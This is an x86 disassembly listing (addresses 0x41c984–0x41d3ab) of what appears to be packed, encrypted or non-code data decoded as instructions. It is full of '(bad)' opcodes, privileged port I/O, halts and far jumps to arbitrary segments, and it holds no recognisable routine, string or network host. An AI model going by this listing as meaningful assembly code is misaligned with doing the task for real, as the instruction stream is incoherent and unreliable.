  41c984:	in     eax,0xd4
  41c986:	add    ecx,esp
  41c988:	out    dx,eax
  41c989:	inc    esp
  41c98a:	sub    ah,cl
  41c98c:	lahf   
  41c98d:	out    0x65,al
  41c98f:	push   eax
  41c990:	inc    ecx
  41c991:	inc    BYTE PTR [ebp+0x1f0c9328]
  41c997:	xchg   ecx,eax
  41c998:	mov    eax,0x760d8e84
  41c99d:	mov    al,ds:0x9957fef9
  41c9a2:	pop    ebx
  41c9a3:	cwde   
  41c9a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a5:	pop    ds
  41c9a6:	adc    dl,bh
  41c9a8:	adc    al,0x6
  41c9aa:	out    0xd0,eax
  41c9ac:	retf   
  41c9ad:	stc    
  41c9ae:	daa    
  41c9af:	push   edi
  41c9b0:	xchg   ebp,eax
  41c9b1:	stc    
  41c9b2:	(bad)  
  41c9b3:	in     al,0x39
  41c9b5:	mov    bl,0xaa
  41c9b7:	les    ecx,FWORD PTR [esi+0x5bcb86ed]
  41c9bd:	les    esi,FWORD PTR [ebp+0x0]
  41c9c0:	inc    eax
  41c9c1:	or     eax,0x661296a0
  41c9c6:	popf   
  41c9c7:	ret    0x7a58
  41c9ca:	adc    al,0x78
  41c9cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9cd:	fild   WORD PTR [edi+ebp*1-0x44]
  41c9d1:	pop    edx
  41c9d2:	ins    DWORD PTR es:[edi],dx
  41c9d3:	xchg   esi,eax
  41c9d4:	pop    ss
  41c9d5:	mov    cl,0x1
  41c9d7:	hlt    
  41c9d8:	ds retf 0x4ab9
  41c9dc:	mov    ds:0xcb44144e,eax
  41c9e1:	aas    
  41c9e2:	inc    esp
  41c9e3:	cmp    al,0x80
  41c9e5:	repnz ror DWORD PTR [edi+0x4ac07598],cl
  41c9ec:	cmp    ch,bl
  41c9ee:	mov    DWORD PTR [eax+0x4a1359c3],0x616af923
  41c9f8:	in     eax,dx
  41c9f9:	xor    eax,DWORD PTR [ebp+0x50461c19]
  41c9ff:	push   ecx
  41ca00:	cmp    eax,0x77f84f0d
  41ca05:	hlt    
  41ca06:	xchg   esi,eax
  41ca07:	inc    ebp
  41ca08:	(bad)  
  41ca09:	mov    al,0xb0
  41ca0b:	cmp    DWORD PTR ds:0x85465f,ecx
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	popf   
  41ca81:	push   0x47
  41ca83:	xchg   edx,eax
  41ca84:	push   eax
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR [ecx+eax*1],al
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	inc    edi
  41ca8d:	aaa    
  41ca8e:	outs   dx,BYTE PTR ds:[esi]
  41ca8f:	fadd   DWORD PTR [esi+0x24]
  41ca92:	lods   eax,DWORD PTR ds:[esi]
  41ca93:	popa   
  41ca94:	or     DWORD PTR [ebp-0x66f30935],eax
  41ca9a:	div    DWORD PTR [esp+esi*8]
  41ca9d:	or     eax,ecx
  41ca9f:	and    eax,DWORD PTR [edi+0x5a]
  41caa2:	cmp    edi,DWORD PTR ds:0x64749169
  41caa8:	cmc    
  41caa9:	push   edx
  41caaa:	cwde   
  41caab:	imul   ebp,DWORD PTR [ebp-0x42c2f574],0xfa9869df
  41cab5:	dec    esp
  41cab6:	in     al,0xa1
  41cab8:	mul    DWORD PTR [edi+0xc3c784e]
  41cabe:	(bad)  
  41cac0:	rol    DWORD PTR cs:[esi+eax*4-0x6ebcbc4a],1
  41cac8:	xor    DWORD PTR [ecx-0x2e],ecx
  41cacb:	sub    eax,0xb8f377f1
  41cad0:	outs   dx,DWORD PTR ds:[esi]
  41cad1:	daa    
  41cad2:	ja     0x41ca86
  41cad4:	xchg   DWORD PTR [ebp-0x4abc1329],edi
  41cada:	fcomp  DWORD PTR [ebp-0x6b32af9a]
  41cae0:	sub    al,0x10
  41cae2:	dec    esi
  41cae3:	aam    0x12
  41cae5:	outs   dx,BYTE PTR ds:[esi]
  41cae6:	mov    ebx,0x7af98b79
  41caeb:	jmp    0x41cad2
  41caed:	dec    edi
  41caee:	out    0x40,eax
  41caf0:	or     eax,0x398d522e
  41caf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caf6:	in     al,0xc3
  41caf8:	sar    BYTE PTR [edx+0x2e6d8312],1
  41cafe:	dec    edi
  41caff:	int3   
  41cb00:	hlt    
  41cb01:	jmp    DWORD PTR [edi-0x6b]
  41cb04:	js     0x41cb46
  41cb06:	xchg   ebp,eax
  41cb07:	lock dec eax
  41cb09:	aam    0xd4
  41cb0b:	add    BYTE PTR [edx+esi*4],al
  41cb0e:	or     edi,DWORD PTR [ebp+0xf153def]
  41cb14:	mov    ch,0x3d
  41cb16:	(bad)  [esi-0x5e]
  41cb19:	inc    eax
  41cb1a:	adc    esi,DWORD PTR [esi+esi*2-0x3261aca9]
  41cb21:	les    ebp,FWORD PTR [edi-0xa]
  41cb24:	sub    al,0x58
  41cb26:	pop    esp
  41cb27:	shl    BYTE PTR [eax*2+0x2f17e311],cl
  41cb2e:	add    ebp,ecx
  41cb30:	mov    edi,0x50d2adc8
  41cb35:	or     edi,DWORD PTR ds:0xc4dff9
  41cb3b:	add    DWORD PTR [edx-0x4277edaf],esi
  41cb41:	mov    WORD PTR [ebx+0x4a7f063c],cs
  41cb47:	pushf  
  41cb48:	jecxz  0x41cacb
  41cb4a:	dec    ecx
  41cb4b:	loopne 0x41cb6c
  41cb4d:	inc    ebx
  41cb4e:	push   ecx
  41cb4f:	cs call 0x9481:0xfe901fa7
  41cb57:	jb     0x41cb29
  41cb59:	in     eax,0xfa
  41cb5b:	mov    ch,0x8a
  41cb5d:	mov    ah,0xdc
  41cb5f:	and    al,dl
  41cb61:	mov    dl,0xbb
  41cb63:	hlt    
  41cb64:	jecxz  0x41cbe3
  41cb66:	fdiv   DWORD PTR [eax+0x0]
  41cb69:	add    ch,BYTE PTR [si]
  41cb6c:	or     ecx,edx
  41cb6e:	cmp    al,0x3e
  41cb70:	mov    bl,0xde
  41cb72:	fisub  DWORD PTR [edx+ebp*2+0x78]
  41cb76:	pop    edx
  41cb77:	cmp    al,0x33
  41cb79:	fldcw  WORD PTR [ecx+ecx*4]
  41cb7c:	jbe    0x41cbae
  41cb7e:	neg    DWORD PTR [edx+edx*1-0x69]
  41cb82:	add    BYTE PTR ds:0xc8da1524,bh
  41cb88:	push   cs
  41cb89:	sub    ecx,esi
  41cb8b:	xchg   edi,eax
  41cb8c:	pop    ds
  41cb8d:	jno    0x41cb93
  41cb8f:	add    BYTE PTR [bx+si],al
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x47166522
  41cc03:	rcl    DWORD PTR [ecx+esi*1+0x1],cl
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	pop    es
  41cc0d:	cdq    
  41cc0e:	clc    
  41cc0f:	stos   BYTE PTR es:[edi],al
  41cc10:	mov    ch,0xe3
  41cc12:	repnz dec ecx
  41cc14:	add    BYTE PTR [edx-0x6bab82ec],ah
  41cc1a:	fwait
  41cc1b:	sub    eax,0x224be232
  41cc20:	lods   al,BYTE PTR ds:[esi]
  41cc21:	sar    BYTE PTR [edi-0x5],1
  41cc24:	fmul   QWORD PTR [eax+0x49540d1b]
  41cc2a:	sub    eax,0x8eefa578
  41cc2f:	jae    0x41cbbc
  41cc31:	jmp    0x2a0c:0xb5fe8e87
  41cc38:	push   ss
  41cc39:	shr    BYTE PTR [ecx-0x15],0xa6
  41cc3d:	sar    DWORD PTR ds:0xf25199cd,0xb8
  41cc44:	mov    dh,0x58
  41cc46:	jg     0x41cc26
  41cc48:	xchg   ecx,eax
  41cc49:	(bad)  
  41cc4a:	cli    
  41cc4b:	pmovmskb edx,mm0
  41cc4e:	inc    esp
  41cc4f:	js     0x41cc14
  41cc51:	hlt    
  41cc52:	sbb    edi,DWORD PTR [ebx]
  41cc54:	mov    BYTE PTR [edi+0x74],bh
  41cc57:	mov    ebp,DWORD PTR [ecx+ebp*2-0x5f]
  41cc5b:	fnstcw WORD PTR [ebp+esi*4-0x3d]
  41cc5f:	and    dl,BYTE PTR [edi-0x26]
  41cc62:	and    DWORD PTR [ecx],esi
  41cc64:	les    ebx,FWORD PTR [ecx]
  41cc66:	cmp    edx,DWORD PTR [di]
  41cc69:	inc    esp
  41cc6a:	pop    edx
  41cc6b:	mov    ds:0x5c7f74cb,al
  41cc70:	cmp    al,0x86
  41cc72:	inc    ebp
  41cc73:	(bad)  
  41cc74:	cli    
  41cc75:	jl     0x41ccd6
  41cc77:	call   0xa08a:0x37d3e6c5
  41cc7e:	lea    ebp,[ebp+0x266f3547]
  41cc84:	sbb    eax,DWORD PTR [esi-0x3c]
  41cc87:	lea    esi,[ebx+eiz*1+0x77]
  41cc8b:	aas    
  41cc8c:	gs xor al,0x8c
  41cc8f:	cmp    BYTE PTR ds:0xa1b98702,al
  41cc95:	pop    ebp
  41cc96:	clc    
  41cc97:	(bad)  
  41cc98:	out    dx,al
  41cc99:	jge    0x41cc49
  41cc9b:	jo     0x41cca2
  41cc9d:	dec    edi
  41cc9e:	ja     0x41cc34
  41cca0:	enter  0x568e,0x6
  41cca4:	retf   
  41cca5:	dec    esi
  41cca6:	(bad)  
  41cca8:	mov    al,ds:0xff018cda
  41ccad:	or     cl,BYTE PTR [esi-0x631ee746]
  41ccb3:	inc    eax
  41ccb4:	jb     0x41ccb6
  41ccb6:	mov    gs,WORD PTR [ebp+0x28]
  41ccb9:	adc    al,0x92
  41ccbb:	frstor [edx+0x39]
  41ccbe:	push   cs
  41ccbf:	fstp   QWORD PTR [edx-0x61]
  41ccc2:	xor    BYTE PTR [ebx-0x3d],dl
  41ccc5:	push   0x5
  41ccc7:	push   0x6470c96c
  41cccc:	cmp    al,0x2a
  41ccce:	sbb    eax,0xc62f0334
  41ccd3:	push   ds
  41ccd4:	xchg   ebp,eax
  41ccd5:	cwde   
  41ccd6:	and    BYTE PTR [eax+0x77],bh
  41ccd9:	stc    
  41ccda:	ins    BYTE PTR es:[edi],dx
  41ccdb:	hlt    
  41ccdc:	inc    ecx
  41ccdd:	cli    
  41ccde:	test   DWORD PTR [eax],edx
  41cce0:	imul   edi,DWORD PTR [ebp+esi*2-0x28620a46],0x60
  41cce8:	mov    ds:0xe0803364,al
  41cced:	sahf   
  41ccee:	xlat   BYTE PTR ds:[ebx]
  41ccef:	adc    eax,0x4f98816c
  41ccf4:	adc    al,BYTE PTR [esi+edi*1-0x5c2edf79]
  41ccfb:	xchg   edx,eax
  41ccfc:	add    DWORD PTR [ecx*4+0x647d2e],esp
  41cd03:	push   edi
  41cd04:	idiv   ebx
  41cd06:	pop    esi
  41cd07:	inc    edi
  41cd08:	mov    bh,0x4e
  41cd0a:	(bad)  
  41cd0b:	xor    eax,DWORD PTR [edi+0xc17561]
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	jae    0x41cd96
  41cd82:	inc    ebx
  41cd83:	(bad)  
  41cd84:	pop    eax
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR [ecx+eax*1],al
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	xor    eax,0xb810661c
  41cd91:	fimul  DWORD PTR [esp+edi*4]
  41cd94:	xor    BYTE PTR ds:0x54b78179,ch
  41cd9a:	enter  0xa0c3,0xd7
  41cd9e:	cdq    
  41cd9f:	push   esi
  41cda0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cda1:	iret   
  41cda2:	addr16 out 0x2f,al
  41cda5:	xchg   ecx,eax
  41cda6:	je     0x41cd6e
  41cda8:	leave  
  41cda9:	arpl   WORD PTR [esi+0x9226b2f],bx
  41cdaf:	xchg   ebp,eax
  41cdb0:	inc    ebx
  41cdb1:	mov    WORD PTR ds:0x768a36ad,cs
  41cdb7:	cmp    BYTE PTR [edx+eiz*4-0x1a],bh
  41cdbb:	shl    BYTE PTR [ebx-0x9c52dba],1
  41cdc1:	in     eax,dx
  41cdc2:	(bad)
  41cdc5:	ret    
  41cdc6:	pop    ss
  41cdc7:	inc    esi
  41cdc8:	fs nop
  41cdca:	mov    edx,0x6015c575
  41cdcf:	loope  0x41cdb8
  41cdd1:	cwde   
  41cdd2:	rcr    bl,1
  41cdd4:	cmp    eax,0x6de5ea21
  41cdd9:	clc    
  41cdda:	mov    eax,0x53ac6b0a
  41cddf:	repz pop es
  41cde1:	jmp    0xd368:0x9f0c7397
  41cde8:	inc    ecx
  41cde9:	retf   0x840c
  41cdec:	xor    dh,BYTE PTR [eax]
  41cdee:	test   eax,0x7c3ac428
  41cdf3:	(bad)  
  41cdf4:	sub    eax,0xfb850a09
  41cdf9:	add    DWORD PTR [ebx],edi
  41cdfb:	pop    esp
  41cdfc:	or     ah,BYTE PTR [esi]
  41cdfe:	jge    0x41cdc6
  41ce00:	inc    ecx
  41ce01:	es mov cl,0xf2
  41ce04:	ins    BYTE PTR es:[edi],dx
  41ce05:	inc    edx
  41ce06:	add    dl,BYTE PTR [edi-0x156ab178]
  41ce0c:	cwde   
  41ce0d:	push   esp
  41ce0e:	jg     0x41cdcf
  41ce10:	push   edx
  41ce11:	ret    
  41ce12:	(bad)  
  41ce13:	bound  eax,QWORD PTR [ebp+0x5e]
  41ce16:	mov    dh,0xf9
  41ce18:	mov    ah,0xce
  41ce1a:	push   0xfffffff7
  41ce1c:	std    
  41ce1d:	outs   dx,BYTE PTR ds:[esi]
  41ce1e:	push   0x58
  41ce20:	das    
  41ce21:	cmp    esp,eax
  41ce23:	pop    ecx
  41ce24:	push   ecx
  41ce25:	aam    0xec
  41ce27:	xchg   ebx,eax
  41ce28:	adc    bl,BYTE PTR [eax+0x61]
  41ce2b:	pop    eax
  41ce2c:	xor    cl,dl
  41ce2e:	mov    WORD PTR [ecx+0x58],gs
  41ce31:	fld    DWORD PTR [edx-0x7c]
  41ce34:	test   BYTE PTR [ebp-0x38],dl
  41ce37:	jl     0x41ce6e
  41ce39:	neg    BYTE PTR [edi-0x78dbda3f]
  41ce3f:	jecxz  0x41ce02
  41ce41:	out    0xc8,eax
  41ce43:	mov    ah,bl
  41ce45:	xchg   ebp,eax
  41ce46:	test   BYTE PTR [edx],bh
  41ce48:	dec    DWORD PTR [ecx+0x79d5d2c6]
  41ce4e:	or     al,cl
  41ce50:	(bad)  
  41ce51:	lock sbb eax,0xc9ea46ab
  41ce57:	addr16 pop ebp
  41ce59:	outs   dx,DWORD PTR ds:[esi]
  41ce5a:	jp     0x41ce99
  41ce5c:	or     ebp,edx
  41ce5e:	imul   eax,DWORD PTR [esi+0x73412555],0x4
  41ce65:	push   ss
  41ce66:	or     dl,BYTE PTR [esi+0x7e99e78e]
  41ce6c:	rol    DWORD PTR [ebx],1
  41ce6e:	cli    
  41ce6f:	cs pop edi
  41ce71:	addr16 cmp al,0x2
  41ce74:	into   
  41ce75:	sbb    bl,ch
  41ce77:	repnz mov al,ds:0xd1321b46
  41ce7d:	sbb    al,0x39
  41ce7f:	in     al,0x44
  41ce81:	cmp    DWORD PTR [eax],eax
  41ce83:	fs repnz fwait
  41ce86:	jb     0x41cec6
  41ce88:	fwait
  41ce89:	iret   
  41ce8a:	div    ebx
  41ce8c:	(bad)  
  41ce8d:	jge    0x41cee3
  41ce8f:	pop    es
	...
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	mov    ebp,0x5cccf5a6
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	psrad  mm6,QWORD PTR [ebp+0x3a]
  41cf10:	loope  0x41cf83
  41cf12:	jmp    0xae9e:0x2cfa3e28
  41cf19:	call   DWORD PTR [edx]
  41cf1b:	push   esp
  41cf1c:	outs   dx,DWORD PTR ds:[esi]
  41cf1d:	aam    0x36
  41cf1f:	push   0xffffff89
  41cf21:	and    eax,0x9df087aa
  41cf26:	jle    0x41cf62
  41cf28:	add    BYTE PTR [edx],0xa9
  41cf2b:	add    dh,BYTE PTR [ecx+0x70]
  41cf2e:	mov    eax,ds:0x832aba8e
  41cf33:	ror    BYTE PTR [ecx],0x56
  41cf36:	cmp    esp,ebp
  41cf38:	xchg   BYTE PTR [edx+0x75],dh
  41cf3b:	add    eax,0x1fae7d70
  41cf40:	mov    ecx,DWORD PTR [eax+0x44f16f33]
  41cf46:	inc    eax
  41cf47:	hlt    
  41cf48:	xchg   DWORD PTR [esi],eax
  41cf4a:	sub    eax,0x2162a5f
  41cf4f:	sub    al,0x54
  41cf51:	inc    esi
  41cf52:	mov    ah,0x2d
  41cf54:	addr16 pop ecx
  41cf56:	mov    esi,0x5867bd27
  41cf5b:	jle    0x41cfb7
  41cf5d:	mov    DWORD PTR es:[edx],ebp
  41cf60:	repz je 0x41cf02
  41cf63:	test   DWORD PTR [ebp+0x5e],ebx
  41cf66:	cmp    al,0x5c
  41cf68:	lods   al,BYTE PTR ds:[esi]
  41cf69:	rcl    DWORD PTR [edi*8+0xa533861],cl
  41cf70:	ror    BYTE PTR [ecx],1
  41cf72:	pop    esi
  41cf73:	adc    eax,0x278ba8f5
  41cf78:	mov    ebx,0x1588b35e
  41cf7d:	jmp    0xeb38:0x45be7afc
  41cf84:	mov    bl,BYTE PTR fs:[edi+0x51]
  41cf88:	in     eax,dx
  41cf89:	mov    fs,esp
  41cf8b:	pop    ecx
  41cf8c:	add    eax,0x8f11f0df
  41cf91:	leave  
  41cf92:	push   edi
  41cf93:	(bad)  
  41cf94:	imul   esp
  41cf96:	adc    edx,DWORD PTR [ebp+eax*1+0x49321c12]
  41cf9d:	adc    DWORD PTR [eax],esp
  41cf9f:	std    
  41cfa0:	adc    al,0xbd
  41cfa2:	mov    dl,0x52
  41cfa4:	mov    eax,ds:0xdfd59a28
  41cfa9:	dec    ebp
  41cfaa:	mov    ebp,0xd16be469
  41cfaf:	adc    BYTE PTR [esi-0x3cb1309a],bh
  41cfb5:	(bad)
  41cfb8:	aaa    
  41cfb9:	fisubr DWORD PTR [ebp-0x53]
  41cfbc:	mov    WORD PTR [eax+0x4da709cc],ds
  41cfc2:	and    bh,dh
  41cfc4:	add    eax,0xcb9c452b
  41cfc9:	inc    esi
  41cfca:	in     al,dx
  41cfcb:	pop    es
  41cfcc:	cli    
  41cfcd:	xor    ah,BYTE PTR [ebx]
  41cfcf:	rcl    BYTE PTR ds:[ecx],1
  41cfd2:	(bad)  
  41cfd3:	push   0x66
  41cfd5:	mov    ah,0x78
  41cfd7:	inc    esp
  41cfd8:	dec    ecx
  41cfd9:	dec    ebx
  41cfda:	cmp    ebp,DWORD PTR [eax+0x27a2ae2d]
  41cfe0:	sbb    al,BYTE PTR [edx+0x41f952c8]
  41cfe6:	or     al,BYTE PTR [ebx]
  41cfe8:	out    0x6f,al
  41cfea:	xchg   ecx,eax
  41cfeb:	ror    DWORD PTR [edi+0x26],0x7f
  41cfef:	mov    al,0xbc
  41cff1:	add    dh,BYTE PTR [esi]
  41cff3:	sbb    al,0xc0
  41cff5:	(bad)  
  41cff6:	push   ecx
  41cff7:	jp     0x41d02b
  41cff9:	push   edx
  41cffa:	sbb    DWORD PTR [edx+edx*2],ecx
  41cffd:	xchg   edx,eax
  41cffe:	push   ds
  41cfff:	mov    esi,0x8bcf20e
  41d004:	dec    esp
  41d005:	daa    
  41d006:	or     DWORD PTR [edi-0x67034098],0x2ead40ad
	...
  41d074:	mov    ecx,0xad432034
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xcb29b2bd
  41d083:	adc    esp,DWORD PTR [eax+0x34]
  41d086:	add    DWORD PTR [eax],eax
  41d088:	add    al,0x1
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	xor    DWORD PTR [ecx],ecx
  41d08e:	iret   
  41d08f:	loop   0x41d0e1
  41d091:	xchg   ebx,eax
  41d092:	fsub   DWORD PTR [edi-0x65d9d66b]
  41d098:	lock and al,0x63
  41d09b:	lods   eax,DWORD PTR ds:[esi]
  41d09c:	inc    esp
  41d09d:	popf   
  41d09e:	fs mov edx,gs
  41d0a1:	imul   ecx,DWORD PTR [edx-0x29],0x4
  41d0a5:	scas   eax,DWORD PTR es:[edi]
  41d0a6:	push   esi
  41d0a7:	int    0xde
  41d0a9:	push   es
  41d0aa:	mov    ebx,edx
  41d0ac:	xchg   edx,eax
  41d0ad:	mov    eax,ds:0x9ddc5dbc
  41d0b2:	mov    bl,0x8f
  41d0b4:	and    eax,0x45444bb5
  41d0b9:	cmp    ah,cl
  41d0bb:	in     eax,dx
  41d0bc:	mov    bh,0xb
  41d0be:	out    dx,eax
  41d0bf:	adc    al,0x17
  41d0c1:	jmp    0x649:0xd2edcb5
  41d0c8:	xor    DWORD PTR [ebp+0x3abf8e7b],0x545c891
  41d0d2:	add    bl,ch
  41d0d4:	push   cs
  41d0d5:	ins    DWORD PTR es:[edi],dx
  41d0d6:	or     esi,esi
  41d0d8:	test   BYTE PTR [edx],cl
  41d0da:	mov    cl,0x9
  41d0dc:	aam    0xfe
  41d0de:	sbb    eax,0x570dc3f3
  41d0e3:	or     eax,0x74fd4735
  41d0e8:	sbb    eax,0x70efb6bc
  41d0ed:	ins    DWORD PTR es:[edi],dx
  41d0ee:	sub    ebx,DWORD PTR [edi+0x1e068c1]
  41d0f4:	pop    ebx
  41d0f5:	mov    ds:0x7f5fbb8,al
  41d0fa:	ror    DWORD PTR [ebx-0x4f09efee],0x69
  41d101:	aaa    
  41d102:	call   0x5e4be899
  41d107:	push   edx
  41d108:	pminub mm1,QWORD PTR [ebp-0x2512b0ce]
  41d10f:	rcr    BYTE PTR [esi+0x7e],cl
  41d112:	in     eax,0x49
  41d114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d115:	(bad)  
  41d117:	fld    TBYTE PTR [ecx+0x62e293c8]
  41d11d:	rcr    BYTE PTR [ebp+0x5e365c87],0x17
  41d124:	mov    eax,ds:0x4a1c7fae
  41d129:	ja     0x41d0c7
  41d12b:	mov    esp,0x938ced41
  41d130:	cmp    eax,0x407ac836
  41d135:	cmc    
  41d136:	jecxz  0x41d147
  41d138:	mov    ds:0x83262548,al
  41d13d:	push   ebx
  41d13e:	cdq    
  41d13f:	jns    0x41d10e
  41d141:	dec    ebx
  41d142:	cmp    ah,BYTE PTR [ebx+0x591daec7]
  41d148:	mov    ch,ch
  41d14a:	jnp    0x41d0fa
  41d14c:	out    dx,eax
  41d14d:	or     eax,0x93cda145
  41d152:	test   DWORD PTR [ebx-0xed7ddca],esp
  41d158:	in     eax,0x1d
  41d15a:	data16 fcom QWORD PTR [ebx+0x31]
  41d15e:	xchg   ebp,eax
  41d15f:	adc    al,0xc5
  41d161:	dec    esp
  41d162:	and    al,0x71
  41d164:	mov    ebx,0x3a6846a9
  41d169:	jmp    0x41d181
  41d16b:	dec    eax
  41d16c:	jl     0x41d1e4
  41d16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d16f:	lahf   
  41d170:	dec    esp
  41d171:	cmp    ebp,DWORD PTR [ecx+0x31036ccd]
  41d177:	jecxz  0x41d17d
  41d179:	xor    eax,0xd643cd97
  41d17e:	lahf   
  41d17f:	jmp    0x5e4ba1aa
  41d184:	inc    esi
  41d185:	sbb    eax,eax
  41d187:	ds dec ebp
  41d189:	pop    esp
  41d18a:	cs jne 0x41d11e
  41d18d:	or     dl,ch
  41d18f:	push   ebx
	...
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	jb     0x41d1ef
  41d202:	ror    ah,cl
  41d204:	fs xor eax,0x1040001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	in     eax,dx
  41d20d:	dec    edi
  41d20e:	sub    bl,dh
  41d210:	ror    DWORD PTR [ebx],0x2
  41d213:	fiadd  DWORD PTR [ebx-0x1c]
  41d216:	jge    0x41d228
  41d218:	cmp    ebp,DWORD PTR [esi+0x48]
  41d21b:	aam    0xe1
  41d21d:	loopne 0x41d264
  41d21f:	add    esi,DWORD PTR [esp+edx*2-0x76]
  41d223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d224:	ins    DWORD PTR es:[edi],dx
  41d225:	mov    eax,?
  41d227:	adc    al,0x7b
  41d229:	jmp    0xae3e:0x44e9f387
  41d230:	jmp    0x9fe0:0xc1ca9be5
  41d237:	xchg   ebx,eax
  41d238:	xchg   esp,eax
  41d239:	fcom   QWORD PTR [ecx-0x11]
  41d23c:	mov    esi,0x332e1dfe
  41d241:	call   0xdb46d7a2
  41d246:	in     eax,0xf2
  41d248:	outs   dx,DWORD PTR ds:[esi]
  41d249:	jno    0x41d24b
  41d24b:	lods   eax,DWORD PTR ds:[esi]
  41d24c:	add    al,ah
  41d24e:	mov    esi,esp
  41d250:	mov    bh,0x8a
  41d252:	push   eax
  41d253:	outs   dx,BYTE PTR ds:[esi]
  41d254:	jp     0x41d2b1
  41d256:	cs in  eax,dx
  41d258:	jg     0x41d25b
  41d25a:	xor    eax,0x560a509f
  41d25f:	les    eax,FWORD PTR [ebx+0x3be2dadb]
  41d265:	push   es
  41d266:	mov    ebp,0x7b17d111
  41d26b:	jmp    0xb6b1:0xb7f42b9
  41d272:	and    dl,BYTE PTR ds:0x85e63d8c
  41d278:	aad    0x94
  41d27a:	mov    esi,0xfbc90d4c
  41d27f:	retf   0x7ca8
  41d282:	aas    
  41d283:	stos   DWORD PTR es:[edi],eax
  41d284:	mov    ?,WORD PTR [eax-0x17]
  41d287:	cmp    al,ch
  41d289:	lods   al,BYTE PTR ds:[esi]
  41d28a:	fs mov ebx,0xc089c7e0
  41d290:	das    
  41d291:	in     al,dx
  41d292:	inc    eax
  41d293:	leave  
  41d294:	pop    ss
  41d295:	push   ss
  41d296:	cmp    esp,DWORD PTR [ecx]
  41d298:	xchg   BYTE PTR ds:0xcd43ee11,al
  41d29e:	dec    esi
  41d29f:	inc    ebx
  41d2a0:	sbb    esp,esp
  41d2a2:	neg    DWORD PTR [esp+esi*4]
  41d2a5:	sub    bl,BYTE PTR [ebx+0x22bb2ddd]
  41d2ab:	xor    al,0x58
  41d2ad:	jg     0x41d32b
  41d2af:	idiv   edx
  41d2b1:	mov    dh,0x80
  41d2b3:	mov    dh,0xcf
  41d2b5:	sar    DWORD PTR [esi],0xda
  41d2b8:	inc    edx
  41d2b9:	xor    dh,BYTE PTR ds:0xcd719cc5
  41d2bf:	jne    0x41d279
  41d2c1:	or     al,0xe9
  41d2c3:	mov    ah,0xe6
  41d2c5:	cld    
  41d2c6:	mov    eax,ds:0xe8519768
  41d2cb:	stos   DWORD PTR es:[edi],eax
  41d2cc:	pushf  
  41d2cd:	cmp    eax,0xe11ee37
  41d2d2:	call   0x469fd636
  41d2d7:	je     0x41d33c
  41d2d9:	jg     0x41d306
  41d2db:	stos   DWORD PTR es:[edi],eax
  41d2dc:	adc    edi,ebx
  41d2de:	cmp    BYTE PTR [eax],0xbb
  41d2e1:	ret    0xeca9
  41d2e4:	cmp    BYTE PTR [edi-0x22],bh
  41d2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2e8:	and    eax,0x1778b2
  41d2ed:	dec    ebp
  41d2ee:	push   ecx
  41d2ef:	shl    BYTE PTR [esi+edx*4],1
  41d2f2:	xor    DWORD PTR [ebp-0x41],ebp
  41d2f5:	int    0xee
  41d2f7:	jecxz  0x41d35a
  41d2f9:	dec    esi
  41d2fa:	or     DWORD PTR [esi-0x7403463d],ebx
  41d300:	sbb    DWORD PTR [edx+0x2b],0x21
  41d304:	stos   DWORD PTR es:[edi],eax
  41d305:	enter  0x3f12,0xb2
  41d309:	sub    DWORD PTR [ebx],ebx
  41d30b:	(bad)  [edi]
  41d30d:	ror    BYTE PTR [ebx+ebx*8+0x0],cl
	...
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	test   eax,0x68271efd
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    al,0x1
  41d38a:	add    BYTE PTR [eax],al
  41d38c:	xor    DWORD PTR [ebp-0x3f6641a8],ebx
  41d392:	cmp    cl,BYTE PTR [ebx+0x35]
  41d395:	pop    ebx
  41d396:	xor    BYTE PTR [esi],ah
  41d398:	xor    eax,0xdc823687
  41d39d:	add    al,0xd9
  41d39f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3a0:	cs loop 0x41d416
  41d3a3:	mov    eax,0x8d554fe
  41d3a8:	fisubr WORD PTR [edx-0x51]
  41d3ab:	in     eax,dx
